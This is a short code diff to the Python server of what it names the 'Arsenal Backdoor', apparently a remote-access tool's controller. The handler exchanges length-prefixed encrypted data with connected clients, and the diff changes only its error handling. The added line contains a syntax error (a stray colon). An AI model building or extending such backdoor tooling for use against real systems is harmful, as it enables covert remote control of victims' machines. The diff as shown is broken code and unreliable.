@@ -43,7 +43,7 @@ def get_data(conn):
         (length,) = struct.unpack('>Q', bs)
     except struct.error as err:
         print("{0}".format(err))
-        break
+        return 0
     data = b''
     while len(data) < length:
         to_read = length - len(data)
@@ -60,7 +60,9 @@ def sendit(conn, output):
 def client(conn, addr, buff):
     conn.send(do_encrypt('Arsenal Backdoor'))
     while True:
-        get_data(conn)
+        data = get_data(conn):
+        if data == 0:
+            break
         print('\n'+str(do_decrypt(data).strip(), 'utf-8'))
         while True:
             try:
